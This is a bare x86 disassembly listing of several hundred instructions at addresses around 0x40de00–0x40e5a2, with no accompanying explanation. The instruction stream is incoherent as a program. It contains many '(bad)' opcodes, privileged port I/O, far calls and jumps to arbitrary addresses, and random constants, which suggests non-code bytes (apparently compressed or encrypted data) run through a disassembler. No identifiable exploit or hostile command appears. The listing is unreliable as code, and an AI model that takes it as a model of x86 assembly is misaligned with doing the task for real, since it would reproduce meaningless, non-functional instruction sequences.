  40de00:	retf   0x4fe3
  40de03:	sub    eax,0x21553c32
  40de08:	ins    DWORD PTR es:[edi],dx
  40de09:	add    BYTE PTR [eax-0x58],ah
  40de0c:	mov    ebx,0xc9adc221
  40de11:	ja     0x40ddd6
  40de13:	mov    al,ds:0xa1aa9a48
  40de18:	xlat   BYTE PTR ds:[ebx]
  40de19:	repnz in eax,dx
  40de1b:	std    
  40de1c:	sub    ah,0x44
  40de1f:	adc    ah,BYTE PTR [ebp+0x7e]
  40de22:	or     eax,0xac40842a
  40de27:	test   eax,0x49ab6147
  40de2c:	xchg   esi,eax
  40de2d:	mov    DWORD PTR [eax-0x11c39347],edx
  40de33:	jns    0x40de0b
  40de35:	mov    edx,0xbed468db
  40de3a:	clc    
  40de3b:	mov    al,ds:0x879579c
  40de40:	cwde   
  40de41:	shl    DWORD PTR ss:[ecx],cl
  40de44:	and    bl,BYTE PTR [ecx]
  40de46:	arpl   WORD PTR [ecx+0x590f37a5],sp
  40de4c:	retf   0x902a
  40de4f:	out    dx,eax
  40de50:	stos   BYTE PTR es:[edi],al
  40de51:	es in  al,dx
  40de53:	mov    al,ds:0x298b177a
  40de58:	lea    esi,[esi*2+0x6fb35f39]
  40de5f:	fs dec ebx
  40de61:	ds loope 0x40de6d
  40de64:	fist   DWORD PTR [edx+ebx*2+0x355fedbb]
  40de6b:	cmp    al,0x28
  40de6d:	cdq    
  40de6e:	push   ds
  40de6f:	enter  0xc0e2,0x66
  40de73:	gs pop esi
  40de75:	je     0x2877f2b4
  40de7b:	cmc    
  40de7c:	jp     0x40dede
  40de7e:	neg    DWORD PTR [ebp+0x475470c4]
  40de84:	test   eax,0xbf0023c8
  40de89:	loopne 0x40de67
  40de8b:	fisub  DWORD PTR ds:0xec5e37ba
  40de91:	data16 add al,0x21
  40de94:	pop    esi
  40de95:	cmp    eax,0xc98345d4
  40de9a:	mov    WORD PTR [edi-0xa170e9d],es
  40dea0:	stos   BYTE PTR es:[edi],al
  40dea1:	mov    al,ds:0x2fe0440c
  40dea6:	loope  0x40de49
  40dea8:	arpl   WORD PTR [ecx+0x294607a5],sp
  40deae:	inc    eax
  40deaf:	mov    dl,0xcc
  40deb1:	xchg   esp,eax
  40deb2:	leave  
  40deb3:	sti    
  40deb4:	pop    esi
  40deb5:	int    0x1a
  40deb7:	mov    esi,0xd6e4b83
  40debc:	aas    
  40debd:	mov    ecx,0x60bff4ce
  40dec2:	ror    BYTE PTR [ebx+0x374dd4c],cl
  40dec8:	outs   dx,DWORD PTR ds:[esi]
  40dec9:	out    0xee,eax
  40decb:	out    0x60,eax
  40decd:	xchg   edi,eax
  40dece:	arpl   WORD PTR [ebp-0x5b59ccb6],sp
  40ded4:	push   ebx
  40ded5:	or     esi,ebp
  40ded7:	inc    edi
  40ded8:	lods   eax,DWORD PTR ds:[esi]
  40ded9:	pop    DWORD PTR [esi+0x54]
  40dedc:	fucom  st(7)
  40dede:	in     eax,dx
  40dedf:	loope  0x40de7e
  40dee1:	mov    al,ds:0xc8bfe027
  40dee6:	ss in  eax,dx
  40dee8:	js     0x40df3c
  40deea:	in     al,0xb0
  40deec:	sti    
  40deed:	xor    ch,BYTE PTR [esi]
  40deef:	push   esp
  40def0:	pop    esp
  40def1:	inc    ebx
  40def2:	pop    ds
  40def3:	add    ecx,esi
  40def5:	dec    BYTE PTR [edx]
  40def7:	test   DWORD PTR [ecx-0x3d],edx
  40defa:	out    0x2e,eax
  40defc:	jae    0x40dec4
  40defe:	add    dl,ch
  40df00:	shl    DWORD PTR [eax-0x49],cl
  40df03:	stc    
  40df04:	jne    0x40df24
  40df06:	pop    ecx
  40df07:	xlat   BYTE PTR ds:[ebx]
  40df08:	xchg   ebp,eax
  40df09:	(bad)  
  40df0a:	pop    esi
  40df0b:	outs   dx,BYTE PTR ds:[esi]
  40df0c:	pop    esi
  40df0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df0e:	bswap  ebx
  40df10:	sbb    al,0x5f
  40df12:	es mov esi,0x266c7427
  40df18:	out    dx,al
  40df19:	push   esp
  40df1a:	add    BYTE PTR [eax+0x33e71c31],dh
  40df20:	iret   
  40df21:	stc    
  40df22:	dec    BYTE PTR ds:0xae1ae403
  40df28:	or     eax,0x493fee40
  40df2d:	stc    
  40df2e:	les    esp,FWORD PTR [edx-0x10]
  40df31:	pop    esi
  40df32:	out    dx,al
  40df33:	sub    al,0xf4
  40df35:	das    
  40df36:	inc    esi
  40df37:	dec    esi
  40df38:	inc    esp
  40df39:	cmp    DWORD PTR [ebp+esi*8+0x6ac8612d],eax
  40df40:	adc    ch,cl
  40df42:	cmp    ebx,DWORD PTR [esi-0xf]
  40df45:	fsub   st(6),st
  40df47:	inc    eax
  40df48:	and    BYTE PTR [esi],ch
  40df4a:	or     eax,0x5bcd539c
  40df4f:	mov    eax,ds:0x3b03055
  40df54:	(bad)  
  40df55:	jge    0x40def7
  40df57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df58:	test   BYTE PTR [ebx-0x12],dh
  40df5b:	(bad)  
  40df5c:	xlat   BYTE PTR ds:[ebx]
  40df5d:	ss std 
  40df5f:	scas   eax,DWORD PTR es:[edi]
  40df60:	mov    al,0x99
  40df62:	jmp    DWORD PTR [eax+0x6af884fa]
  40df68:	xor    bl,BYTE PTR [edi-0x679f593]
  40df6e:	jmp    0x40dfdc
  40df70:	fld    st(4)
  40df72:	sbb    edx,ebx
  40df74:	jbe    0x40df76
  40df76:	leave  
  40df77:	pop    edi
  40df78:	enter  0x3a60,0x78
  40df7c:	cmc    
  40df7d:	shl    BYTE PTR ds:0xee83dd97,cl
  40df83:	adc    cl,BYTE PTR [edi-0x45c2c2cd]
  40df89:	mov    ch,0x60
  40df8b:	mov    eax,ds:0xdb06c2bd
  40df90:	push   ebx
  40df91:	cmp    BYTE PTR [edi],al
  40df93:	cld    
  40df94:	fs ud2 
  40df97:	aam    0x39
  40df99:	loope  0x40df73
  40df9b:	out    dx,al
  40df9c:	mov    bl,0x77
  40df9e:	xor    ah,BYTE PTR [ecx-0x7ee0d821]
  40dfa4:	mov    BYTE PTR [esi+0x6f5e8694],bh
  40dfaa:	mov    dl,0x7
  40dfac:	dec    ebp
  40dfad:	imul   eax,DWORD PTR [eax+0x6e],0x7a
  40dfb1:	pusha  
  40dfb2:	push   edx
  40dfb3:	jl     0x40df64
  40dfb5:	shr    BYTE PTR [eax+0x65],0xd3
  40dfb9:	pop    ebx
  40dfba:	in     eax,dx
  40dfbb:	pop    ecx
  40dfbc:	lds    esp,FWORD PTR [esi-0x52]
  40dfbf:	pop    eax
  40dfc0:	fiadd  DWORD PTR [edi]
  40dfc2:	scas   al,BYTE PTR es:[edi]
  40dfc3:	and    BYTE PTR [ebp-0x1322f55b],al
  40dfc9:	adc    eax,0x1c9600ee
  40dfce:	cdq    
  40dfcf:	mov    edi,DWORD PTR [edi+0x72984aca]
  40dfd5:	or     al,0xee
  40dfd7:	jne    0x40dfd4
  40dfd9:	adc    esi,DWORD PTR [eax+0x19f6a0cf]
  40dfdf:	mov    eax,ds:0x661c7b0f
  40dfe4:	xor    dl,BYTE PTR [esi-0x4c9fa2b2]
  40dfea:	(bad)  
  40dfec:	mov    dl,0x78
  40dfee:	daa    
  40dfef:	add    ebx,edi
  40dff1:	out    0xf4,eax
  40dff3:	sahf   
  40dff4:	dec    esi
  40dff5:	fild   QWORD PTR [edx]
  40dff7:	ins    DWORD PTR es:[edi],dx
  40dff8:	fisub  WORD PTR [edx]
  40dffa:	leave  
  40dffb:	test   esi,ecx
  40dffd:	(bad)  
  40dffe:	out    dx,al
  40dfff:	adc    eax,0x7408d8a1
  40e004:	add    al,0x1c
  40e006:	xor    ah,BYTE PTR [ecx-0x432490dc]
  40e00c:	inc    esp
  40e00d:	loope  0x40dfd8
  40e00f:	jbe    0x40e06f
  40e011:	inc    edi
  40e012:	pop    edx
  40e013:	add    ecx,DWORD PTR [edx-0x37]
  40e016:	xchg   edi,eax
  40e017:	enter  0x6119,0xf5
  40e01b:	sub    eax,DWORD PTR ds:0x17ddc4ba
  40e021:	test   al,0xee
  40e023:	xor    ah,cl
  40e025:	mov    ecx,DWORD PTR [edx-0x8128da5]
  40e02b:	mov    ds:0x730a229d,eax
  40e030:	es loop 0x40e081
  40e033:	popf   
  40e034:	loopne 0x40e0a8
  40e036:	test   DWORD PTR [eax-0x32],0x9f0501a5
  40e03d:	lods   al,BYTE PTR ds:[esi]
  40e03e:	in     al,0x9e
  40e040:	leave  
  40e041:	pusha  
  40e042:	call   0x49a9:0x3250e657
  40e049:	mov    ds:0x7bc74fee,eax
  40e04e:	aam    0x73
  40e050:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e051:	sub    edi,DWORD PTR [esi+0x149bf6a0]
  40e057:	retf   
  40e058:	sbb    eax,0x54b357b7
  40e05d:	mov    esp,0x865ea44f
  40e062:	mov    ebp,0x536b0032
  40e067:	mov    eax,ds:0x775fe49a
  40e06c:	sub    dh,BYTE PTR [ecx+ebp*4]
  40e06f:	jp     0x40e0a8
  40e071:	mov    ah,0x89
  40e073:	and    DWORD PTR [ebx-0x581014d0],ebx
  40e079:	popa   
  40e07a:	(bad)  
  40e07b:	mov    ds:0xd5bb381a,eax
  40e080:	adc    eax,0xf51c8e3c
  40e085:	adc    esp,DWORD PTR ds:0x676081e0
  40e08b:	lahf   
  40e08c:	shl    dh,cl
  40e08e:	pop    eax
  40e08f:	jb     0x40e0d5
  40e091:	popa   
  40e092:	jmp    0x42e519f9
  40e097:	push   ds
  40e098:	into   
  40e099:	mov    cl,0xee
  40e09b:	and    eax,0x7edbeb6a
  40e0a0:	mov    al,0x4c
  40e0a2:	mov    WORD PTR [esi+0x60dd67c9],cs
  40e0a8:	mov    ds:0xd5230009,eax
  40e0ad:	inc    ebx
  40e0ae:	out    dx,al
  40e0af:	xor    al,0x62
  40e0b1:	jnp    0x40e10c
  40e0b3:	dec    esp
  40e0b4:	and    al,BYTE PTR ss:0xa7a1f5a2
  40e0bb:	mov    esp,DWORD PTR [edx+esi*4-0x57]
  40e0bf:	scas   eax,DWORD PTR es:[edi]
  40e0c0:	outs   dx,BYTE PTR ds:[esi]
  40e0c1:	mov    ebx,0x5943a812
  40e0c6:	ret    
  40e0c7:	sbb    ch,cl
  40e0c9:	shl    BYTE PTR [ebx-0x10bce202],0xba
  40e0d0:	retf   
  40e0d1:	js     0x40e0f2
  40e0d3:	xor    DWORD PTR [ebx+ebx*1-0x80],0xc35c583f
  40e0db:	adc    eax,0x2156d3df
  40e0e0:	push   ebp
  40e0e1:	ins    BYTE PTR es:[edi],dx
  40e0e2:	lods   eax,DWORD PTR ds:[esi]
  40e0e3:	mov    eax,0x1bee8f84
  40e0e8:	adc    bl,dl
  40e0ea:	cmp    esp,DWORD PTR [ecx]
  40e0ec:	ss jae 0x40e0f2
  40e0ef:	stos   DWORD PTR es:[edi],eax
  40e0f0:	xor    al,0xf0
  40e0f2:	outs   dx,BYTE PTR ds:[esi]
  40e0f3:	push   ecx
  40e0f4:	pop    es
  40e0f5:	in     eax,0xef
  40e0f7:	sbb    al,BYTE PTR [ebx+0x125e741]
  40e0fd:	(bad)  
  40e0fe:	lahf   
  40e0ff:	jae    0x40e14f
  40e101:	push   ecx
  40e102:	add    ah,BYTE PTR [ebp+0x5380611f]
  40e108:	ss cmc 
  40e10a:	mov    edi,0xed8b640f
  40e10f:	in     al,0xdd
  40e111:	dec    esi
  40e112:	inc    edi
  40e113:	inc    esi
  40e114:	inc    edi
  40e115:	mov    BYTE PTR [esi],dh
  40e117:	and    eax,0xe93c6155
  40e11c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e11d:	xchg   esi,eax
  40e11e:	repz jno 0x40e0e2
  40e121:	jno    0x40e0fb
  40e123:	leave  
  40e124:	ins    BYTE PTR es:[edi],dx
  40e125:	shr    esi,cl
  40e127:	pop    edi
  40e128:	dec    ebp
  40e129:	ja     0x40e0fb
  40e12b:	test   BYTE PTR ss:0xa0aaa118,dl
  40e132:	xchg   ebx,eax
  40e133:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e134:	outs   dx,BYTE PTR ds:[esi]
  40e135:	idiv   DWORD PTR [ecx+edi*1]
  40e138:	pop    esi
  40e139:	pop    ds
  40e13a:	test   BYTE PTR [eax],cl
  40e13c:	or     eax,0x31d8c88b
  40e141:	popa   
  40e142:	cmp    esp,DWORD PTR [ebx]
  40e144:	out    0x93,eax
  40e146:	gs dec eax
  40e148:	xchg   ebx,eax
  40e149:	pop    ecx
  40e14a:	jmp    0x40e110
  40e14c:	add    al,0xd1
  40e14e:	test   DWORD PTR [esi-0x71f8374a],eax
  40e154:	jmp    0x42e2587f
  40e159:	and    BYTE PTR [eax],dl
  40e15b:	shl    DWORD PTR [esi+0x2f],cl
  40e15e:	jo     0x40e16d
  40e160:	fs mov bh,0x9
  40e163:	mov    dl,0x6
  40e165:	mov    eax,ds:0x165d32c8
  40e16a:	(bad)  
  40e16b:	stos   BYTE PTR es:[edi],al
  40e16c:	rcl    DWORD PTR [edx],1
  40e16e:	outs   dx,BYTE PTR ds:[esi]
  40e16f:	inc    edi
  40e170:	pushf  
  40e171:	lea    ebx,[ebx-0x1182236b]
  40e177:	jae    0x40e112
  40e179:	or     eax,0x6be322d9
  40e17e:	sbb    BYTE PTR [edi+0x283e676a],cl
  40e184:	or     bh,BYTE PTR [esi+0x504a8434]
  40e18a:	data16 mov ds,WORD PTR [ebp-0x52]
  40e18e:	or     ch,ah
  40e190:	out    dx,eax
  40e191:	xchg   ecx,eax
  40e192:	out    dx,eax
  40e193:	ds mov ecx,0xca670460
  40e199:	mov    ds:0x93a4bf22,eax
  40e19e:	lahf   
  40e19f:	mov    eax,ds:0x8f2b9ccf
  40e1a4:	and    dh,BYTE PTR [ebx+0x296d78f0]
  40e1aa:	(bad)  
  40e1ab:	dec    dh
  40e1ad:	inc    edx
  40e1ae:	stos   DWORD PTR es:[edi],eax
  40e1af:	ficom  WORD PTR [edi+0x2350c4d6]
  40e1b5:	xchg   esp,eax
  40e1b6:	loop   0x40e158
  40e1b8:	xor    eax,0x3f107b75
  40e1bd:	popf   
  40e1be:	data16 or al,0x5e
  40e1c1:	mov    WORD PTR [edi],ds
  40e1c3:	loope  0x40e206
  40e1c5:	xchg   edx,eax
  40e1c6:	mov    ecx,0x9f615991
  40e1cb:	ins    BYTE PTR es:[edi],dx
  40e1cc:	(bad)  
  40e1cd:	ds jo  0x40e16f
  40e1d0:	dec    esi
  40e1d1:	mov    dl,0x16
  40e1d3:	mov    DWORD PTR [edx-0x40],edx
  40e1d6:	add    BYTE PTR [edi],dl
  40e1d8:	inc    esi
  40e1d9:	adc    BYTE PTR [ebx+0x37],ch
  40e1dc:	xor    DWORD PTR [ecx+esi*1],edi
  40e1df:	or     DWORD PTR [ecx+0x46],ebx
  40e1e2:	lea    edx,[ebx-0x5b80cb2f]
  40e1e8:	mov    dh,0x1
  40e1ea:	pop    ecx
  40e1eb:	xor    BYTE PTR [esi+0x5e77ddfd],dl
  40e1f1:	dec    ebp
  40e1f2:	test   BYTE PTR [edx],0x5c
  40e1f5:	and    dh,BYTE PTR [esi+0x60614799]
  40e1fb:	xor    eax,0x550f1e82
  40e200:	sub    dl,ah
  40e202:	jmp    0x40e1a6
  40e204:	fs add al,0x30
  40e207:	adc    DWORD PTR [ebx],edi
  40e209:	shl    DWORD PTR [ecx*8+0x6a367476],1
  40e210:	shl    BYTE PTR [eax+0xa],cl
  40e213:	sbb    esi,esp
  40e215:	leave  
  40e216:	xor    eax,0xb252f362
  40e21b:	xchg   DWORD PTR [eax+0x2b299959],esp
  40e221:	mov    dl,0xce
  40e223:	leave  
  40e224:	xchg   esp,eax
  40e225:	sbb    BYTE PTR [ebx-0x5f],0xb9
  40e229:	hlt    
  40e22a:	rcr    BYTE PTR [ecx-0x1a24263b],0xf5
  40e231:	push   cs
  40e232:	jmp    0x40e276
  40e234:	cmp    BYTE PTR [eax-0x11],0xff
  40e238:	pop    ss
  40e239:	mov    ecx,0x661b636b
  40e23e:	jo     0x40e208
  40e240:	pop    esi
  40e241:	ss cmp ebx,edx
  40e244:	mov    cl,BYTE PTR [esi+0x3e]
  40e247:	sbb    eax,0xb48e985d
  40e24c:	into   
  40e24d:	sub    eax,0xa73e56cf
  40e252:	xchg   ebp,eax
  40e253:	ja     0x40e27f
  40e255:	popa   
  40e256:	stos   BYTE PTR es:[edi],al
  40e257:	fcmove st,st(0)
  40e259:	(bad)  
  40e25a:	mov    eax,0xee6691a2
  40e25f:	adc    DWORD PTR [ebx+0x10],ebx
  40e262:	ja     0x40e202
  40e264:	leave  
  40e265:	add    DWORD PTR [edi+esi*8],ecx
  40e268:	cmp    ah,BYTE PTR [ecx-0x7]
  40e26b:	and    al,0x43
  40e26d:	mov    ebx,0x2b65dbd7
  40e272:	out    dx,al
  40e273:	add    ecx,DWORD PTR [edx-0xeb00f6c]
  40e279:	mov    ebx,0x1209a0de
  40e27e:	jae    0x40e2f3
  40e280:	pop    ss
  40e281:	add    eax,0xa14cfb12
  40e286:	inc    ebp
  40e287:	sbb    DWORD PTR [esi-0x36],0xb55d6cb7
  40e28e:	cmp    al,0xa1
  40e290:	mov    bh,0x5e
  40e292:	dec    ecx
  40e293:	cmp    esp,edi
  40e295:	mov    edx,DWORD PTR [eax]
  40e297:	call   0x4b0207fa
  40e29c:	mov    dl,0x62
  40e29e:	or     ah,dl
  40e2a0:	aam    0x60
  40e2a2:	fidiv  DWORD PTR [ecx]
  40e2a4:	dec    edi
  40e2a5:	push   ebx
  40e2a6:	mov    bl,0xb2
  40e2a8:	sti    
  40e2a9:	dec    ecx
  40e2aa:	out    dx,al
  40e2ab:	not    DWORD PTR [edx+0x46]
  40e2ae:	or     edi,DWORD PTR [edi]
  40e2b0:	int    0xd
  40e2b2:	pop    esi
  40e2b3:	mov    ds:0x2175ae33,al
  40e2b8:	(bad)  
  40e2b9:	fwait
  40e2ba:	mov    dl,0x73
  40e2bc:	mov    esi,0x5ea20ae4
  40e2c1:	dec    ecx
  40e2c2:	mov    al,0x80
  40e2c4:	and    esp,DWORD PTR [ebp-0x46eaf853]
  40e2ca:	daa    
  40e2cb:	mov    eax,ds:0x1c9c223e
  40e2d0:	sub    BYTE PTR [ecx+0x56634aa3],ch
  40e2d6:	jne    0x40e30a
  40e2d8:	mov    ecx,ss
  40e2da:	pop    ds
  40e2db:	ror    DWORD PTR [esi-0x42c2d816],0x64
  40e2e2:	push   ss
  40e2e3:	in     al,0x5e
  40e2e5:	jmp    0x12d50905
  40e2ea:	popf   
  40e2eb:	pop    esi
  40e2ec:	pop    esi
  40e2ed:	lds    ebx,FWORD PTR [ecx+esi*2-0x26]
  40e2f1:	and    BYTE PTR [eax+0x1b],bh
  40e2f4:	dec    eax
  40e2f5:	and    ebp,DWORD PTR [esp+esi*8]
  40e2f8:	mov    edx,0x11e5855d
  40e2fd:	es mov ch,0x2b
  40e300:	mov    esi,0x5ea66270
  40e305:	jge    0x40e294
  40e307:	fwait
  40e308:	jmp    0x40e28f
  40e30a:	(bad)  
  40e30b:	sbb    al,0xec
  40e30d:	sar    BYTE PTR [edx-0x5f],0xe6
  40e311:	dec    esi
  40e312:	jne    0x40e342
  40e314:	push   ds
  40e315:	jno    0x40e35f
  40e317:	xchg   edi,eax
  40e318:	jl     0x40e316
  40e31a:	pusha  
  40e31b:	pop    esi
  40e31c:	pop    esi
  40e31d:	call   0xf8f2:0x3aae87f1
  40e324:	sbb    DWORD PTR [ebp-0x7d],0x58
  40e328:	push   esi
  40e329:	test   ecx,ecx
  40e32b:	in     eax,dx
  40e32c:	out    0x97,al
  40e32e:	out    dx,eax
  40e32f:	iret   
  40e330:	pop    esi
  40e331:	or     bl,cl
  40e333:	mov    esi,0xfa944f2b
  40e338:	xchg   edi,eax
  40e339:	push   edx
  40e33a:	pop    eax
  40e33b:	mov    bh,0xd3
  40e33d:	jns    0x40e2ed
  40e33f:	hlt    
  40e340:	outs   dx,DWORD PTR ds:[esi]
  40e341:	into   
  40e342:	mov    ch,0x70
  40e344:	pop    esi
  40e345:	xor    esp,DWORD PTR [edx]
  40e347:	fbstp  TBYTE PTR [eax-0xb]
  40e34a:	icebp  
  40e34b:	outs   dx,BYTE PTR ds:[esi]
  40e34c:	mov    dh,0x59
  40e34e:	imul   DWORD PTR [ebp+0x4f25b477]
  40e354:	pop    esi
  40e355:	mov    al,0xf4
  40e357:	or     BYTE PTR [ebx],dh
  40e359:	or     ebx,ebp
  40e35b:	sbb    bh,BYTE PTR [ebp-0x64d3b511]
  40e361:	call   0xbb249afc
  40e366:	mov    bh,0xa0
  40e368:	and    edx,DWORD PTR [edx+0x3e97684]
  40e36e:	dec    ecx
  40e36f:	dec    ebx
  40e370:	pop    edi
  40e371:	push   es
  40e372:	mov    ah,0x96
  40e374:	sbb    ch,al
  40e376:	dec    eax
  40e377:	pop    ecx
  40e378:	xor    DWORD PTR [edi+eax*4-0x5f],edi
  40e37c:	(bad)  
  40e37d:	enter  0xeb0b,0xd8
  40e381:	nop
  40e382:	(bad)  
  40e383:	xor    eax,0x1cb2675b
  40e388:	mov    ecx,0x16435dcc
  40e38d:	icebp  
  40e38e:	ds xchg esi,eax
  40e390:	mov    al,0x60
  40e392:	xchg   DWORD PTR [edi+0x66],edi
  40e395:	jg     0x40e334
  40e397:	dec    esi
  40e398:	jne    0x40e38b
  40e39a:	out    dx,al
  40e39b:	test   BYTE PTR [ecx-0x34906536],ch
  40e3a1:	mov    ecx,0x1257a14e
  40e3a6:	stos   BYTE PTR es:[edi],al
  40e3a7:	leave  
  40e3a8:	rol    BYTE PTR [ecx],0xf
  40e3ab:	cld    
  40e3ac:	pop    esi
  40e3ad:	loope  0x40e3a9
  40e3af:	cvttps2pi mm1,xmm4
  40e3b2:	retf   0x7e1e
  40e3b5:	pusha  
  40e3b6:	or     eax,0xe1771f8a
  40e3bb:	ja     0x40e3f5
  40e3bd:	pop    ebx
  40e3be:	out    dx,al
  40e3bf:	jns    0x40e387
  40e3c1:	fdivr  st,st(2)
  40e3c3:	push   cs
  40e3c4:	dec    ebp
  40e3c5:	fmul   DWORD PTR [ecx+eiz*4]
  40e3c8:	push   ss
  40e3c9:	adc    WORD PTR ds:0x604db728,0xfffe
  40e3d1:	xchg   BYTE PTR [eax+0x3b],dh
  40e3d4:	push   ebx
  40e3d5:	rcr    BYTE PTR [edi],1
  40e3d7:	fstp   st(0)
  40e3d9:	loop   0x40e3c2
  40e3db:	aad    0xab
  40e3dd:	out    dx,al
  40e3de:	push   0x40fb38c1
  40e3e3:	sub    DWORD PTR [ebp+0x5a],ebx
  40e3e6:	test   al,0x13
  40e3e8:	stos   BYTE PTR es:[edi],al
  40e3e9:	aaa    
  40e3ea:	sub    bh,BYTE PTR [edx-0x3a6613c2]
  40e3f0:	outs   dx,BYTE PTR ds:[esi]
  40e3f1:	sbb    eax,0xa0d88ebd
  40e3f6:	in     al,dx
  40e3f7:	sub    bl,BYTE PTR [ecx]
  40e3f9:	data16 xor BYTE PTR [ecx+0x5e],bh
  40e3fd:	test   BYTE PTR [edi+0x26],ah
  40e400:	mov    es,WORD PTR [ebp+ebx*2+0x3160e0ce]
  40e407:	ins    BYTE PTR es:[edi],dx
  40e408:	pushf  
  40e409:	fs int 0xe6
  40e40c:	dec    eax
  40e40d:	je     0x40e3fc
  40e40f:	call   0x5198:0xdf72776f
  40e416:	push   esi
  40e417:	pop    esp
  40e418:	mov    bl,0x65
  40e41a:	icebp  
  40e41b:	ret    
  40e41c:	pop    esi
  40e41d:	movups xmm3,XMMWORD PTR [eiz*2+0x5bdbe829]
  40e425:	dec    ecx
  40e426:	test   edi,ebp
  40e428:	out    dx,al
  40e429:	inc    esi
  40e42a:	mov    ss,WORD PTR [edi]
  40e42c:	cli    
  40e42d:	in     al,0x74
  40e42f:	mov    eax,ds:0x5b68a681
  40e434:	in     al,0x7c
  40e436:	fwait
  40e437:	dec    ecx
  40e438:	pop    esi
  40e439:	(bad)  
  40e43a:	fnsave [ecx]
  40e43c:	mov    ebp,0xe2a54ba8
  40e441:	and    bh,dh
  40e443:	mov    al,ds:0xe51e19ae
  40e448:	rcl    DWORD PTR [edi+eiz*2],0xc6
  40e44c:	pop    esi
  40e44d:	scas   eax,DWORD PTR es:[edi]
  40e44e:	jle    0x40e408
  40e450:	(bad)  
  40e452:	sub    BYTE PTR [ecx],0x7c
  40e455:	and    al,0x87
  40e457:	lahf   
  40e458:	inc    edx
  40e459:	pop    esp
  40e45a:	ret    
  40e45b:	aad    0x9e
  40e45d:	repnz xor BYTE PTR [di],cl
  40e461:	out    dx,al
  40e462:	out    dx,al
  40e463:	call   0xe350:0x80c91a27
  40e46a:	(bad)  
  40e46c:	or     BYTE PTR [ecx+0x42],ah
  40e46f:	mov    al,0xb5
  40e471:	mov    BYTE PTR [ecx],0x80
  40e474:	sub    esi,ebx
  40e476:	out    dx,al
  40e477:	mov    ebx,0x641af39d
  40e47c:	push   ebx
  40e47d:	in     eax,dx
  40e47e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e47f:	mov    ds:0x95e2b40b,al
  40e484:	pop    ss
  40e485:	shr    DWORD PTR [ebp-0x7b],1
  40e488:	push   esi
  40e489:	mov    al,ds:0xb2680dee
  40e48e:	shr    DWORD PTR [ecx-0x73],0xa9
  40e492:	aas    
  40e493:	div    BYTE PTR [edx+0x4da12bf0]
  40e499:	mov    ds:0xcea2de7b,eax
  40e49e:	aam    0x32
  40e4a0:	fs cmp DWORD PTR cs:[edx],edx
  40e4a4:	js     0x40e506
  40e4a6:	fwait
  40e4a7:	jmp    0x356d:0xa4636c58
  40e4ae:	mov    ch,0xbf
  40e4b0:	xchg   ecx,eax
  40e4b1:	push   esi
  40e4b2:	xchg   BYTE PTR [edi],ch
  40e4b4:	inc    esp
  40e4b5:	addr16 hlt 
  40e4b7:	xrelease mov BYTE PTR [eax],dl
  40e4ba:	push   esi
  40e4bb:	pusha  
  40e4bc:	pop    esi
  40e4bd:	fdiv   QWORD PTR [esi]
  40e4bf:	aaa    
  40e4c0:	in     al,0x8c
  40e4c2:	fild   QWORD PTR [esi+0x676b3f0d]
  40e4c8:	loopne 0x40e4c1
  40e4ca:	clc    
  40e4cb:	stc    
  40e4cc:	xlat   BYTE PTR ds:[ebx]
  40e4cd:	mov    edi,0xa9dd808e
  40e4d2:	and    DWORD PTR [ebp-0x32c9f8d],ebx
  40e4d8:	test   al,0x7a
  40e4da:	and    DWORD PTR [esi-0x50],ebp
  40e4dd:	push   ecx
  40e4de:	js     0x40e4a4
  40e4e0:	stc    
  40e4e1:	adc    ebp,DWORD PTR [esi+0x929db99]
  40e4e7:	ja     0x40e547
  40e4e9:	xchg   esi,eax
  40e4ea:	lea    ecx,ds:0x277ab756
  40e4f0:	daa    
  40e4f1:	popa   
  40e4f2:	mov    dh,0x93
  40e4f4:	mov    ah,0xf0
  40e4f6:	ss pop edx
  40e4f8:	sub    dl,BYTE PTR [eax]
  40e4fa:	fnstcw WORD PTR [eax+0x41ff275e]
  40e500:	dec    esi
  40e501:	sahf   
  40e502:	dec    esp
  40e503:	or     eax,0x19106155
  40e508:	pop    ds
  40e509:	fs (bad) 
  40e50b:	mov    BYTE PTR [edi],cl
  40e50d:	inc    esi
  40e50e:	and    al,0xb
  40e510:	and    ah,BYTE PTR [ecx-0x80]
  40e513:	push   edi
  40e514:	add    BYTE PTR [edx-0x3],ch
  40e517:	or     esi,DWORD PTR [esi]
  40e519:	popa   
  40e51a:	and    edi,ecx
  40e51c:	dec    ebx
  40e51d:	sbb    al,0xa3
  40e51f:	xor    al,0x55
  40e521:	and    al,0xe7
  40e523:	mov    BYTE PTR [esi+0x6ef8226d],dl
  40e529:	sub    eax,edi
  40e52b:	fcmovb st,st(6)
  40e52d:	pusha  
  40e52e:	jns    0x40e4fa
  40e530:	call   0x40655d49
  40e535:	cld    
  40e536:	out    dx,al
  40e537:	mov    DWORD PTR [ecx],ecx
  40e539:	ds sbb ch,al
  40e53c:	mov    ah,0xc8
  40e53e:	daa    
  40e53f:	ins    DWORD PTR es:[edi],dx
  40e540:	mov    ds:0xc9f63860,eax
  40e545:	popf   
  40e546:	push   0xffffff9a
  40e548:	adc    ebp,DWORD PTR [ecx-0x59d3bb19]
  40e54e:	call   0xa321:0xd653fd
  40e555:	inc    eax
  40e556:	addr16 loopne 0x40e54c
  40e559:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e55a:	call   0x22f9c42e
  40e55f:	mov    eax,ds:0xa545dbb1
  40e564:	arpl   WORD PTR [edi+0x4b14a3d0],bp
  40e56a:	test   ch,cl
  40e56c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e56d:	cld    
  40e56e:	fwait
  40e56f:	mov    esp,DWORD PTR [ebx-0x61e8bc73]
  40e575:	xchg   ecx,eax
  40e576:	mov    DWORD PTR [ebx+0x5e],ebp
  40e579:	sbb    ebp,ecx
  40e57b:	and    BYTE PTR [ecx-0x72],ch
  40e57e:	and    ebx,eax
  40e580:	int    0x60
  40e582:	bound  edi,QWORD PTR [edi+0x1c8d7900]
  40e588:	(bad)  
  40e589:	and    eax,esi
  40e58b:	and    ah,BYTE PTR [eax]
  40e58d:	jecxz  0x40e563
  40e58f:	gs ins DWORD PTR es:[edi],dx
  40e591:	cdq    
  40e592:	cs popf 
  40e594:	pop    bx
  40e596:	xor    ah,BYTE PTR [ecx-0x68df12d3]
  40e59c:	das    
  40e59d:	repz inc ebp
  40e59f:	sbb    DWORD PTR [edi+0x15],ebx
  40e5a2:	cli    
